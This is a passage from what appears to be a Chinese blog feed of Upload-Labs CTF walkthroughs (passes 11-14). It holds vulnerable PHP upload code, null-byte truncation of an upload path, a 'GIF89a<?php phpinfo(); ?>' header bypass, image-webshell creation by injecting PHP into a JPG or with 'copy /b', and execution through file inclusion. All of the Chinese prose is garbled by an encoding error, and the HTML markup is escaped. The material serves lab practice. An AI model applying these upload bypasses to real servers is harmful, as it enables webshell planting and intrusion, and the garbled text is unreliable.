&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;order&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $short &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]) &lt;span style="color:#f92672"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $short &lt;span style="color:#f92672"&gt;=&lt;/span&gt; (&lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;]) &lt;span style="color:#f92672"&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;8&lt;/span&gt;) &lt;span style="color:#f92672"&gt;+&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;ord&lt;/span&gt;($short[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; $short;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;public&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;function&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;eof&lt;/span&gt;() {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#f92672"&gt;!&lt;/span&gt;$this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;&lt;span style="color:#f92672"&gt;||&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;strlen&lt;/span&gt;($this&lt;span style="color:#f92672"&gt;-&amp;gt;&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;binData&lt;/span&gt;) &lt;span style="color:#f92672"&gt;===&lt;/span&gt; &lt;span style="color:#ae81ff"&gt;0&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;?&amp;gt;&lt;/span&gt;&lt;span style="color:#960050;background-color:#1e0010"&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id="å‡†å¤‡-1"&gt;å‡†å¤‡
&lt;/h4&gt;&lt;p&gt;â€‹ å‡†å¤‡ä¸€ä¸ª&lt;strong&gt;yoo.jpg&lt;/strong&gt;å›¾ç‰‡ï¼Œä¸Šä¼ ç»è¿‡æ¸²æŸ“ä»¥åå†ä¸‹è½½ä¸‹åˆ°æœ¬åœ°ï¼Œä¿å­˜ä¸º&lt;strong&gt;1.jpg&lt;/strong&gt;ã€‚&lt;/p&gt;
&lt;h4 id="æ’å…¥ä»£ç "&gt;æ’å…¥ä»£ç 
&lt;/h4&gt;&lt;p&gt;â€‹ ä½¿ç”¨è„šæœ¬å¤„ç†&lt;strong&gt;1.jpg&lt;/strong&gt;æ’å…¥phpä»£ç ï¼Œæ‰§è¡Œå‘½ä»¤&lt;code&gt;php jpg_payload.php 1.jpg&lt;/code&gt;ã€‚phpå‘½ä»¤æ‰§è¡Œæ–¹æ³•ä¸Šé¢æœ‰ã€‚æ‰§è¡ŒæˆåŠŸä»¥ååº”è¯¥å¦‚å›¾æ‰€ç¤ºï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116212640.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æ‰§è¡Œçš„ç›®å½•ä¸‹ä¼šå¤šå‡ºä¸€ä¸ªåä¸º&lt;code&gt;payload_1.jpg&lt;/code&gt;çš„æ–‡ä»¶ï¼Œè¿™å°±æ˜¯åˆ¶ä½œå¥½çš„å›¾ç‰‡é©¬ã€‚å¤§ä½¬çš„æºç æˆ‘æ˜¯ä¿®æ”¹äº†ä¸€ä¸‹çš„ï¼Œå¯ä»¥ä¿®æ”¹ä¸Šé¢çš„ç¬¬25è¡Œä»£ç ï¼Œè‡ªå®šä¹‰æ’å…¥æƒ³è¦çš„ä»£ç ã€‚&lt;/p&gt;
&lt;h4 id="ä¸Šä¼ å¹¶éªŒè¯"&gt;ä¸Šä¼ å¹¶éªŒè¯
&lt;/h4&gt;&lt;p&gt;â€‹ ä¸Šä¼ ä»¥ååŒæ ·å…ˆç¡®å®šå›¾ç‰‡çš„åç§°å’Œåœ°å€ï¼Œé€‚ç”¨æ–‡ä»¶åŒ…å«è¿›è¡ŒéªŒè¯&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116215008.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ å¦‚æœå¦‚å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬çš„å›¾ç‰‡é©¬å°±ä¸Šä¼ æˆåŠŸäº†ã€‚&lt;strong&gt;éœ€è¦æé†’ï¼šæœ‰äº›å›¾ç‰‡ä¸è¡Œå¯èƒ½éœ€è¦å¤šæ¢å‡ ä¸ªå›¾ç‰‡è¯•ä¸€è¯•ï¼ï¼ï¼&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;å‘¼ï¼Œç»ˆäºå¯ä»¥ä¼‘æ¯äº†ã€‚&lt;/p&gt;</description></item><item><title>Upload-Labs(ä¸‰)</title><link>/posts/ctf/upload-labs3/</link><pubDate>Mon, 16 Nov 2020 16:04:30 +0000</pubDate><guid>/posts/ctf/upload-labs3/</guid><description>&lt;h2 id="å‰è¨€"&gt;å‰è¨€
&lt;/h2&gt;&lt;p&gt;â€‹ ç»§ç»­æ¥ç€ä¸Šä¸€æ¬¡çš„&lt;code&gt;Upload-labs&lt;/code&gt;å¾€ä¸‹å†™ã€‚è¿™è®°ä¸‹ç¬¬11-15é¢˜ï¼Œç›®å‰è¿›åº¦æ˜¯20é¢˜éƒ½å·²ç»å®Œæˆæ­£åœ¨æŠ½æ—¶é—´å†™åšå®¢ï¼Œç„¶å16é¢˜æ˜¯æˆ‘å¡çš„æœ€ä¹…çš„å…³ï¼Œä¸è¿‡ä¹Ÿå­¦åˆ°äº†æ„Ÿè§‰å¾ˆç‰›çš„å§¿åŠ¿ï¼Œæ‰€ä»¥åˆ°æ—¶å€™ä¸“é—¨å¼€ä¸€ç¯‡åªè®²16ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ åœ¨çº¿é¶æœºåœ°å€ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#Upload-Labs-Linux" target="_blank" rel="noopener"
&gt;linuxç¯å¢ƒ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class="link" href="https://buuoj.cn/challenges#[Windows]Upload-Labs-Windows" target="_blank" rel="noopener"
&gt;windowsç¯å¢ƒ&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="pass-11"&gt;Pass-11
&lt;/h2&gt;&lt;p&gt;â€‹ (è¿™é¢˜ä½¿ç”¨äº†windowsç¯å¢ƒ)&lt;/p&gt;
&lt;p&gt;â€‹ æºç ï¼š&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-php" data-lang="php"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;false&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;$msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;null&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;isset&lt;/span&gt;($_POST[&lt;span style="color:#e6db74"&gt;&amp;#39;submit&amp;#39;&lt;/span&gt;])){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $ext_arr &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;array&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;jpg&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;png&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;gif&amp;#39;&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $file_ext &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;substr&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;],&lt;span style="color:#a6e22e"&gt;strrpos&lt;/span&gt;($_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;],&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;+&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;in_array&lt;/span&gt;($file_ext,$ext_arr)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $temp_file &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_FILES[&lt;span style="color:#e6db74"&gt;&amp;#39;upload_file&amp;#39;&lt;/span&gt;][&lt;span style="color:#e6db74"&gt;&amp;#39;tmp_name&amp;#39;&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $img_path &lt;span style="color:#f92672"&gt;=&lt;/span&gt; $_GET[&lt;span style="color:#e6db74"&gt;&amp;#39;save_path&amp;#39;&lt;/span&gt;]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;rand&lt;/span&gt;(&lt;span style="color:#ae81ff"&gt;10&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;99&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;date&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#34;YmdHis&amp;#34;&lt;/span&gt;)&lt;span style="color:#f92672"&gt;.&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;.&amp;#34;&lt;/span&gt;&lt;span style="color:#f92672"&gt;.&lt;/span&gt;$file_ext;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt;(&lt;span style="color:#a6e22e"&gt;move_uploaded_file&lt;/span&gt;($temp_file,$img_path)){
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $is_upload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;true&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ä¸Šä¼ å‡ºé”™ï¼&amp;#39;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; } &lt;span style="color:#66d9ef"&gt;else&lt;/span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; $msg &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; }
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;â€‹ åˆ†æä»£ç å‘ç°æ˜¯ä¸€ä¸ªç™½åå•éªŒè¯ï¼Œä½†æ˜¯å’Œä¹‹å‰ä¸åŒç‚¹åœ¨äºè·¯å¾„ä¸­ä½¿ç”¨äº†&lt;code&gt;$_GET['save_path']&lt;/code&gt;ï¼Œæœ¬é¢˜æç¤ºä¹Ÿå†™é“&lt;/p&gt;
&lt;p&gt;&lt;code&gt;æœ¬passä¸Šä¼ è·¯å¾„å¯æ§ï¼&lt;/code&gt;ï¼Œå°±æ˜¯é€šè¿‡è¿™ä¸ªGETå˜é‡æ§åˆ¶ä¸Šä¼ è·¯å¾„ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ è¿™ä¸€å…³çš„çªç ´æ–¹æ³•éœ€è¦æœ‰ä¸€äº›æ¡ä»¶ï¼šphpç‰ˆæœ¬éœ€è¦ä½äº&lt;code&gt;5.3.29&lt;/code&gt;ï¼ˆæˆ‘ä½¿ç”¨çš„æ˜¯phpç‰ˆæœ¬5.3.17çš„æœ¬åœ°é¶æœºï¼‰ï¼Œå¦ä¸€ä¸ªæ¡ä»¶æ˜¯&lt;code&gt;magic_quotes_gpc&lt;/code&gt;éœ€è¦ä¸ºå…³é—­çŠ¶æ€ã€‚&lt;code&gt;magic_quotes_gpc&lt;/code&gt;çš„ä½œç”¨å®˜æ–¹æ–‡æ¡£å†™é“ï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Warning&lt;/strong&gt; æœ¬ç‰¹æ€§å·²è‡ª PHP 5.3.0 èµ·&lt;em&gt;åºŸå¼ƒ&lt;/em&gt;å¹¶å°†è‡ª PHP 5.4.0 èµ·&lt;em&gt;ç§»é™¤&lt;/em&gt;ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ ä¸º GPC (Get/Post/Cookie) æ“ä½œè®¾ç½® magic_quotes çŠ¶æ€ã€‚ å½“ magic_quotes ä¸º onï¼Œæ‰€æœ‰çš„ &amp;rsquo; (å•å¼•å·)ã€&amp;quot; (åŒå¼•å·)ã€\ï¼ˆåæ–œæ ï¼‰å’Œ NUL&amp;rsquo;s è¢«ä¸€ä¸ªåæ–œæ è‡ªåŠ¨è½¬ä¹‰ã€‚&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;â€‹ ä½¿ç”¨bpæŠ“åŒ…å¹¶æ·»åŠ &lt;code&gt;0x00æˆªæ–­&lt;/code&gt;ï¼Œåœ¨GETè¯·æ±‚ä¸­å¯ä»¥ä½¿ç”¨urlç¼–ç çš„æˆªæ–­ï¼š&lt;code&gt;%00&lt;/code&gt;ã€‚è´´ä¸ªè‡ªå·±å‚è€ƒçš„åšå®¢ï¼Œ&lt;a class="link" href="https://www.cnblogs.com/milantgh/p/3612978.html" target="_blank" rel="noopener"
&gt;æˆªæ–­ä¸Šä¼ åŸç†å‰–æ&lt;/a&gt;ã€‚ä¸ªäººå¯¹äºè¿™é“é¢˜çš„åˆ†æå°±æ˜¯ï¼Œä¸Šé¢æ–‡ä»¶çš„ä»£ç æ‰§è¡Œåˆ°ç¬¬8è¡Œçš„æ—¶å€™ï¼Œè·å–åˆ°äº†&lt;code&gt;$_GET['save_path']&lt;/code&gt;å˜é‡çš„å€¼ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨è¿™ä¸ªå˜é‡åé¢æ·»åŠ äº†&lt;code&gt;0x00æˆªæ–­&lt;/code&gt;ï¼Œæ‰€ä»¥åé¢çš„ä»£ç ä¾¿ä¸ä¼šæ‰§è¡Œï¼Œæ–‡ä»¶ä¹Ÿå°±ä¸ä¼šè¢«é‡å‘½åã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115204109.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ æ–‡ä»¶æˆåŠŸä¸Šä¼ ï¼Œç„¶åè®¿é—®çš„æ—¶å€™è®°å¾—æ”¹ä¸€ä¸‹è·¯å¾„ï¼Œå› ä¸ºæ–‡ä»¶åå·²ç»æˆªæ–­ï¼Œæ‰€ä»¥è®¿é—®è·¯å¾„ç”±&lt;code&gt;..../upload/233.phpï¿½/5120201115205501.jpg&lt;/code&gt;å˜ä¸º&lt;code&gt;..../upload/233.php&lt;/code&gt;ã€‚å®Œå·¥&lt;/p&gt;
&lt;h2 id="pass-12"&gt;Pass-12
&lt;/h2&gt;&lt;p&gt;â€‹ ï¼ˆwindowsç¯å¢ƒï¼‰&lt;/p&gt;
&lt;p&gt;â€‹ è¿™é¢˜å’Œä¸Šä¸€é¢˜å·®ä¸å¤šä¸€æ ·ï¼Œå°±æ˜¯æŠŠ&lt;code&gt;$_GET['save_path']&lt;/code&gt;å˜æˆäº†&lt;code&gt;$_POST['save_path']&lt;/code&gt;ã€‚ç”±GETè¯·æ±‚æ”¹æˆäº†POSTè¯·æ±‚ï¼Œä½†æ˜¯æŠ“åŒ…ä¿®æ”¹çš„åœ°æ–¹å°±ä¸ä¸€æ ·äº†ï¼Œéœ€è¦é€šè¿‡&lt;strong&gt;16è¿›åˆ¶ä¿®æ”¹&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115210935.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ è¿™é‡Œæˆ‘å‘½åä¸º&lt;code&gt;233.phpa&lt;/code&gt;æ˜¯å› ä¸ºæ–¹ä¾¿æˆ‘åœ¨Hexè¡¨ä¸­æ‰¾åˆ°è¿™å¥è¯çš„ä½ç½®å’Œä¿®æ”¹æ•°æ®ã€‚&lt;code&gt;a&lt;/code&gt;çš„16è¿›åˆ¶æ˜¯&lt;code&gt;61&lt;/code&gt;ï¼Œéœ€è¦æ”¹æˆæˆªæ–­çš„å€¼ï¼š&lt;code&gt;00&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115211024.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ ä¸Šä¼ æˆåŠŸä»¥åæ‰“å¼€å›¾ç‰‡ï¼Œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œéœ€è¦æŠŠè·¯å¾„ä¸­å·²ç»æˆªæ–­çš„åé¢åˆ é™¤æ‰ã€‚å®Œå·¥&lt;/p&gt;
&lt;h2 id="pass-13"&gt;Pass-13
&lt;/h2&gt;&lt;p&gt;â€‹ ï¼ˆLinuxç¯å¢ƒï¼‰&lt;/p&gt;
&lt;p&gt;â€‹ æºç ä¸­æœ‰å…³çš„å‡½æ•°è§£é‡Šï¼š&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class="link" href="https://segmentfault.com/a/1190000008305573" target="_blank" rel="noopener"
&gt;PHPä¸­packã€unpackçš„è¯¦ç»†ç”¨æ³•&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.php.net/manual/zh/function.fread.php" target="_blank" rel="noopener"
&gt;fread()&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.php.net/fclose" target="_blank" rel="noopener"
&gt;fclose()&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.php.net/intval" target="_blank" rel="noopener"
&gt;intval()&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;â€‹ è¿™é“é¢˜å’Œå‰é¢é¢˜ç›®éƒ½ä¸ä¸€æ ·äº†ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201115211509.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;â€‹ é¢˜ç›®è¯´é“éœ€è¦&lt;strong&gt;ä¸Šä¼ å›¾ç‰‡é©¬&lt;/strong&gt;ï¼Œç„¶åä½¿ç”¨&lt;strong&gt;æ–‡ä»¶åŒ…å«æ¼æ´&lt;/strong&gt;è¿›è¡Œæµ‹è¯•ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å…ˆåˆ¶ä½œå›¾ç‰‡é©¬ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ æŸ¥çœ‹æœ¬é¢˜çš„æç¤º&lt;code&gt;æœ¬passæ£€æŸ¥å›¾æ ‡å†…å®¹å¼€å¤´2ä¸ªå­—èŠ‚ï¼&lt;/code&gt;ï¼Œæ„æ€å°±æ˜¯åªæ£€æµ‹æ–‡ä»¶å‰é¢ä¸¤ä¸ªå­—èŠ‚çš„æ ‡è¯†ï¼Œè´´ä¸€ä¸ª&lt;a class="link" href="https://blog.csdn.net/qq_37414405/article/details/84660148" target="_blank" rel="noopener"
&gt;å„ç§æ ¼å¼å›¾ç‰‡æ–‡ä»¶å¤´æ ‡è¯†åˆ†æ&lt;/a&gt;ï¼Œæ‰€ä»¥è¿™é“é¢˜åªç”¨åœ¨ä¸Šä¼ çš„æ–‡ä»¶å¤´éƒ¨çš„ä¸¤ä¸ªå­—èŠ‚å¤„ç²˜è´´å¯¹åº”&lt;strong&gt;æ–‡ä»¶çš„å¤´æ ‡è¯†&lt;/strong&gt;å³å¯ç»•è¿‡æ£€æµ‹ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ ä»¥GIFçš„æ–‡ä»¶å¤´GIF89a ä¸ºä¾‹ï¼Œåˆ›å»ºæ–‡ä»¶notepad++ç¼–è¾‘æ‰“å¼€è¾“å…¥&lt;code&gt;GIF89a&amp;lt;?php phpinfo(); ?&amp;gt;&lt;/code&gt;ï¼Œåç¼€åæ— æ‰€è°“äº†ï¼Œå› ä¸ºé¢˜ç›®åªæ£€æµ‹å‰ä¸¤ä¸ªå­—èŠ‚å³å¯ä¸Šä¼ ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ &lt;strong&gt;è¿˜æœ‰ä¸€ç§æ–¹æ³•åˆ¶ä½œå›¾ç‰‡é©¬&lt;/strong&gt;ï¼šä½¿ç”¨windowsçš„&lt;code&gt;copy /b&lt;/code&gt;æŒ‡ä»¤ï¼ŒæŠŠä¸¤ä¸ªæ–‡ä»¶è¿›è¡Œ&lt;del&gt;æ— ç¼&lt;/del&gt;æ‹¼æ¥ï¼Œå¯ä»¥ä½¿ç”¨ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡åŠ ä¸€ä¸ªphpæ–‡ä»¶è¿›è¡Œæ‹¼æ¥ï¼Œå³å¯æ­£å¸¸ä¸Šä¼ ã€‚å‚è€ƒåšå®¢ï¼š&lt;a class="link" href="https://blog.csdn.net/gaoshi66/article/details/83653143" target="_blank" rel="noopener"
&gt;windowsçª—å£å‘½ä»¤â€”â€”(copy/b)æ–‡ä»¶æ— ç¼æ‹¼æ¥éšè—&lt;/a&gt;ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ åˆ«å¿˜äº†é¢˜ç›®ä¸­è¯´é“äº†éœ€è¦&lt;strong&gt;ä¸‰ç§åç¼€éƒ½ä¸Šä¼ æˆåŠŸæ‰ç®—è¿‡å…³ï¼&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;â€‹ &lt;strong&gt;ä¸Šä¼ ä»¥åéœ€è¦ä½¿ç”¨æ–‡ä»¶åŒ…å«è¿›è¡Œåˆ¤å®šæ˜¯å¦æ‰§è¡Œ&lt;/strong&gt;ï¼Œå…ˆåœ¨æ–°æ ‡ç­¾é¡µé¢ä¸­æ‰“å¼€å›¾ç‰‡ï¼Œurlä¸­è®°ä¸‹å›¾ç‰‡åœ¨æœåŠ¡å™¨ä¸­çš„ç›®å½•å’Œåç§°ï¼ˆæˆ‘çš„å›¾ç‰‡åç§°ä¸º8220201116071327.gifï¼‰ï¼Œç‚¹å‡»&lt;strong&gt;2&lt;/strong&gt;çš„é“¾æ¥è¿›å…¥&lt;code&gt;include.php&lt;/code&gt;è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼šç½‘å€è¾“å…¥&lt;code&gt;https://...../include.php?file=./upload/8220201116071327.gif&lt;/code&gt;ï¼Œæ‰¾åˆ°phpæˆåŠŸæ‰§è¡Œçš„é¡µé¢ã€‚è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå°çŸ¥è¯†ç‚¹æˆ‘å­¦åˆ°çš„å°±æ˜¯ï¼š&lt;a class="link" href="https://www.cnblogs.com/xc90/articles/10257402.html" target="_blank" rel="noopener"
&gt;è·¯å¾„ä¸­çš„&amp;rsquo;.&amp;lsquo;å’Œ&amp;rsquo;..&amp;lsquo;è¿˜æœ‰&amp;rsquo;./&amp;lsquo;å’Œ&amp;rsquo;../&amp;lsquo;éƒ½æ˜¯ä»€ä¹ˆæ„æ€&lt;/a&gt;ã€‚å®Œå·¥&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116152417.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;h2 id="pass-14"&gt;Pass-14
&lt;/h2&gt;&lt;p&gt;â€‹ ï¼ˆLinuxç¯å¢ƒï¼‰&lt;/p&gt;
&lt;p&gt;â€‹ è¿™é¢˜æç¤ºå†™é“&lt;code&gt;æœ¬passä½¿ç”¨getimagesize()æ£€æŸ¥æ˜¯å¦ä¸ºå›¾ç‰‡æ–‡ä»¶ï¼&lt;/code&gt;ï¼Œå’Œä¸Šä¸€é¢˜ä¸ä¸€æ ·çš„åœ°æ–¹å°±æ˜¯ä½¿ç”¨äº†&lt;code&gt;getimagesize()&lt;/code&gt;å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„å®˜æ–¹æ–‡æ¡£&lt;a class="link" href="https://www.php.net/manual/zh/function.getimagesize.php" target="_blank" rel="noopener"
&gt;getimagesize()&lt;/a&gt;ï¼Œæ‰€ä»¥è¿™é“é¢˜å°±ä¸èƒ½ç”¨13é¢˜çš„åŠ &lt;strong&gt;æ–‡ä»¶çš„å¤´æ ‡è¯†&lt;/strong&gt;æ–¹æ³•ç»•è¿‡ï¼Œè¿™æ¬¡è¦ä½¿ç”¨ä¸Šä¸€é¢˜ä¸­çš„&lt;code&gt;copy /b&lt;/code&gt;æŒ‡ä»¤ç”¨ä¸€å¼ æ­£å¸¸çš„å›¾ç‰‡è¿›è¡Œæ‹¼æ¥è¿˜æ˜¯å¯ä»¥é€šè¿‡çš„ã€‚&lt;/p&gt;
&lt;p&gt;â€‹ PSï¼šå¬åŒå­¦è¯´&lt;code&gt;getimagesize()&lt;/code&gt;ä¸è¿‡æ˜¯æ£€æµ‹äº†å‰å…«ä¸ªå­—èŠ‚ï¼Œä¸è¿‡æˆ‘æ²¡è¯•ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20201116155407.png"
loading="lazy"
&gt;&lt;/p&gt;
